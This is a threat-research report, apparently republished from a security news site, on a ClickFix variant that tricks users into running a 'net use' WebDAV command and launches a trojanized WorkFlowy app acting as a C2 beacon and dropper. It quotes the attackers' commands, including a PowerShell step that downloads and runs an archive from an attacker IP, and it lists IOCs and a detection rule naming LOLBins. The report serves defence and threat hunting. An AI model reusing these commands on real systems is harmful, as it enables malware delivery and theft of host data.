---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-03-14T05:50:06.002122+00:00'
exported_at: '2026-03-14T05:50:07.458833+00:00'
feed: https://feeds.feedburner.com/TheHackersNews
language: en
source_url: https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html
structured_data:
  about: []
  author: ''
  description: New ClickFix variant maps WebDAV drive to run trojanized WorkFlowy
    app, enabling stealth C2 beacon and payload delivery.
  headline: Investigating a New Click-Fix Variant
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Investigating a New Click-Fix Variant
updated_at: '2026-03-14T05:50:06.002122+00:00'
url_hash: 56a5498b85cdd3c8bd253778265cff16c354e95f
---

***Disclaimer***
*: This report has been prepared by the Threat Research Center to enhance cybersecurity awareness and support the strengthening of defense capabilities. It is based on independent research and observations of the current threat landscape available at the time of publication. The content is intended for informational and preparedness purposes only.*

Read more blogs around threat intelligence and adversary research:
<https://atos.net/en/lp/cybershield>

#### **Summary**

Atos Researchers identified a new variant of the popular ClickFix technique, where attackers convince the user to execute a malicious command on their own device through the Win + R shortcut. In this variation, a “net use” command is used to map a network drive from an external server, after which a “.cmd” batch file hosted on that drive is executed. Script downloads a ZIP archive, unpacks it, and executes the legitimate WorkFlowy application with modified, malicious logic hidden inside “.asar” archive. This acts as a C2 beacon and a dropper for the final malware payload.

|  |
| --- |
|  |
| Figure 1: High-level overview of attack flow. |

## Attack overview

In this version, the initial vector of attack is the same as in all the other ones, a web page posing as a captcha mechanism – “happyglamper[.]ro”. It prompts the user to open the Run application via “Win+R”, followed by “Ctrl+V” and “Enter”

|  |
| --- |
|  |
| Figure 2: Phishing website 1 |

|  |
| --- |
|  |
| Figure 3: Phishing website 2 |

This executes the following command:

```
“cmd.exe” /c net use Z: http://94.156.170[.]255/webdav /persistent:no && “Z:\update.cmd” & net use Z: /delete
```

Typically, at this stage, attackers have used PowerShell or mshta to download and execute the next stage of the malware. Here, instead, we can see that “net use” is being used to map and connect to a network drive of an external server from which a Batch script is executed. While not novel, these TTPs were never seen in ClickFix attacks before. Combined with the next uncommon stages of infection patterns, this campaign gives Adversaries high chances to evade defensive controls and stay under the radar of defenders.

In this case, the observed ClickFix variant of execution flow successfully bypassed the detection of Microsoft Defender for Endpoint. Atos security teams were able to detect it only thanks to the internal Threat Hunting service focusing on the main behavioral aspect of the ClickFix technique – initial execution through the RunMRU registry key (
[hunting query available in the Appendix section](https://docs.google.com/document/d/1r34Rnlsdw-ISnATBS-SfmYNTu1Ln07IY/edit#heading=h.65tqoanctmva)
).

The initial execution script “update.cmd” is loaded from the mapped drive and executed; after that, the mapped drive is removed. Content of “update.cmd”:

```
start "" /min powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'http://94.156.170[.]255/flowy.zip' -OutFile \"$env:TEMP\dl.zip\";
Expand-Archive \"$env:TEMP\dl.zip\" -DestinationPath \"$env:LOCALAPPDATA\MyApp\" -Force;
Start-Process \"$env:LOCALAPPDATA\MyApp\WorkFlowy.exe\""
```

This spawns a PowerShell instance which downloads a zip archive and extracts it into “%LOCALAPPDATA%\MyApp\” directory. Then it executes “WorkFlowy.exe” binary.

|  |
| --- |
|  |
| Figure 4: Content of flowy.zip archive |

## WorkFlowy analysis

The archive contains a WorkFlowy desktop application (version 1.4.1050), signed by the developer “FunRoutine Inc.”, distributed as an Electron application bundle. Electron applications are written using popular web technologies – HTML, CSS, and JavaScript – and use “.asar” archives to pack source code during application packing. It is done for various reasons, like mitigating issues around long path names on Windows. The malicious code was injected into main.js, the Node.js entry point of the app, hidden inside the app.asar archive.

**Technical Profile**

|  |  |
| --- | --- |
| Property | Value |
| Target application | WorkFlowy Desktop (Electron) |
| Malicious version | 1.4.1050 |
| Malicious file | resources/app.asar → /main.js |
| C2 domain | cloudflare.report/forever/e/ |
| C2 origin IP | 144[.]31[.]165[.]173 (Frankfurt, AS215439 play2go.cloud) |
| Domain registered | January 2026, HK registrant, OnlineNIC registrar |
| Victim ID file | %APPDATA%\id.txt |
| Dropper staging dir | %TEMP%\[unix\_timestamp]\ |

## Infection Vector

The malicious ASAR archive is a direct replacement for the legitimate resources/app.asar. The attacker repackaged an older version of the app (v1.4 vs. the current v4.3) with injected code.

|  |
| --- |
|  |
| Figure 5: Content of "resources" subdirectory |

## Malicious Code (Dropper/Beacon)

When WorkFlowy is executed, it looks for app.asar file in the relative path hardcoded into the binary. It then reads the main.js file from inside of it, decodes it to a string, and parses it to the embedded V8 Google JavaScript engine, which executes it. Attackers have replaced the legitimate main.js with one they have created themselves. Instead of well-structured scripts, they have used heavily obfuscated on-liner structure, adding malicious code on top of legitimate one, ensuring it is executed first and blocking WorkFlowy functionality.

Malicious code contains several critical functions:

1. **Malware executes before the legitimate application starts:**
   The injected IIFE opens with await f() — the infinite C2 beacon loop. Because f() never resolves, all legitimate WorkFlowy initialization code that follows is permanently blocked. The malware runs with full Node.js privileges immediately on launch.
2. **Persistent victim fingerprinting via %APPDATA%\id.txt:**
   A random 8-character alphanumeric ID is generated on first run and written to %APPDATA%\id.txt. On subsequent runs, the stored ID is read back, giving the attacker a stable identifier for each victim machine across sessions.
3. **C2 beacon — exfiltrates host identity every 2 seconds:**
   Function u() sends an HTTP POST containing the victim's unique ID, machine name, and Windows username to the C2 server. The loop in f() repeats this indefinitely with a 2-second interval.
4. **Remote payload download and execution:**
   Function p() receives a task object from the C2, decodes base64-encoded file contents, writes them to a timestamped directory under %TEMP%, and executes any .exe via child\_process.exec.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZoXWMCcrVJF_eEF9OrKhfTuwUu2_qRvFs4CkXQX-f9zbsDGJmaiXQYs9dIdSC5rLdiGlxQ1GCYDWGRbmiAodrIYQ4LQHHSMzgDodOOCaNTTXThRCUqhFIVCkp9j0kiNdUsSI8HCuQkE3QWyX1OKROrPgV3nf60aUYWGXOmv1fcIJVG7OmM0Bvf3ST0Sce/s1600/9.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZoXWMCcrVJF_eEF9OrKhfTuwUu2_qRvFs4CkXQX-f9zbsDGJmaiXQYs9dIdSC5rLdiGlxQ1GCYDWGRbmiAodrIYQ4LQHHSMzgDodOOCaNTTXThRCUqhFIVCkp9j0kiNdUsSI8HCuQkE3QWyX1OKROrPgV3nf60aUYWGXOmv1fcIJVG7OmM0Bvf3ST0Sce/s1600/9.png)

If the C2 connection is not established, no files or directories are generated. At the time of this analysis, the C2 domain was already unresponsive.

## Why Electron is an Effective Delivery mechanism

The malicious code runs in the Node.js main process - outside the Chromium sandbox - with the full privileges of the logged-in user, allowing for the malicious code to execute any actions the user is allowed to do on the system. No files are actually written to disk, and since the malicious payload is packed inside “.asar” archive, it additionally helps to hide malicious code.

## Persistence

No OS-level persistence is implemented via the dropper. The beacon runs only while WorkFlowy is open. The only artifact written to disk before next stage delivery is %APPDATA%\id.txt (victim tracking ID), and that is only if the connection to C2 is established correctly. Presumably, an OS-level persistence is delegated to whatever payload the C2 delivers via the dropper.

Read more blogs around threat intelligence and adversary research:
<https://atos.net/en/lp/cybershield>

## Key takeaways

This ClickFix variant is significant because it moves initial access away from commonly abused scripting and execution engines such as PowerShell, MSHTA, and WScript, and instead relies on net use to abuse WebDAV as a delivery mechanism. Previous ClickFix campaigns typically exposed themselves by directly invoking interpreters or living‑off‑the‑land binaries that are heavily monitored by modern EDR solutions. In contrast, this iteration mounts a remote WebDAV share as a local drive, executes a hosted batch file through standard filesystem semantics, and removes the mapping immediately after use. This shows that ClickFix still evolves, expanding its arsenal of proxy execution methods and starting to utilize native networking utilities.

The malicious logic is hidden by replacing the content of the Workflowy application’s app.asar archive with a trojanized version of main.js. Because the code runs inside the Electron main process and remains packaged within a legitimate application, it avoids many file‑based and behavioral detections that focus on standalone loaders or script interpreters. ASAR archives are rarely inspected, allowing the dropper logic to execute through normal application startup with minimal visibility.

This activity was not detected by security controls and was only identified through targeted threat hunting at Atos. Detection relied on analyzing execution context rather than payload indicators, specifically hunting for suspicious command execution originating from the Explorer Run dialog (recorded inside the RunMRU Registry Key). This underscores the growing importance of threat hunting as a complementary detection mechanism: as ClickFix campaigns shift toward native utilities and trusted applications that generate few alerts, only proactive, hypothesis-driven hunting can help surface these weak signals early enough to disrupt the attack chain.

## Appendixes

#### IOCs

|  |  |
| --- | --- |
| Domain | cloudflare[.]report |
| Domain | happyglamper[.]ro |
| IP | 94[.]156[.]170[.]255 |
| IP | 144[.]31[.]165[.]173 |
| URL | https://cloudflare[.]report/forever/e/ |
| File | %APPDATA%\id.txt |
| Path | %TEMP%\[13-digit-timestamp]\ |
| SHA256 | a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063 (app.asar) |
| SHA256 | 9ee58eb59e337c06429ff3f0afd0ee6886b0644ddd4531305b269e97ad2b8d42 (WorkFlowy.exe – Older version of legitimate binary, not malicious) |
| SHA256 | dc95f7c7fb98ec30d3cb03963865a11d1b7b696e34f163b8de45f828b62ec829 (main.js) |

### Hunting Query

* title: Suspicious Commands executed via Run dialog
* id: 20891a30-032e-4f15-a282-fa4a8b0d8aae
* status: experimental
* description:
* Detects suspicious command interpreters and LOLBins written into the Explorer RunMRU registry key (commonly used for Run dialog history), with explorer.exe as the initiating process.
* author: TRC
* date: 2026-03-05
* tags:
* - attack.execution
* - attack.t1059
* - attack.defense\_evasion
* logsource:
* category: registry\_set
* product: windows
* definition: "Sysmon Event ID 13 (Registry value set) or equivalent EDR registry telemetry"
* detection:
* selection\_key:
* TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
* selection\_proc:
* Image|endswith: '\explorer.exe'
* selection\_data:
* Details|contains:
* - 'cmd '
* - 'powershell '
* - 'cmd.exe '
* - 'powershell.exe '
* - 'wscript.exe '
* - 'cscript.exe '
* - 'net.exe '
* - 'net1.exe '
* - 'sh.exe '
* - 'bash.exe '
* - 'schtasks.exe '
* - 'regsvr32.exe '
* - 'hh.exe '
* - 'wmic.exe '
* - 'mshta.exe '
* - 'rundll32.exe '
* - 'msiexec.exe '
* - 'forfiles.exe '
* - 'scriptrunner.exe '
* - 'mftrace.exe '
* - 'AppVLP.exe '
* - 'svchost.exe '
* - 'msbuild.exe '
* condition: selection\_key and selection\_proc and selection\_data
* falsepositives:
* - "Legitimate administrative activity using Run dialog (Win+R) to execute built-in tools."
* - "IT scripts or troubleshooting steps executed interactively by a user."
* level: medium

Read more blogs around threat intelligence and adversary research:
<https://atos.net/en/lp/cybershield>

Found this article interesting?

This article is a contributed piece from one of our valued partners.

Follow us on

[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ)

,

[Twitter](https://twitter.com/thehackersnews)

and

[LinkedIn](https://www.linkedin.com/company/thehackernews/)

to read more exclusive content we post.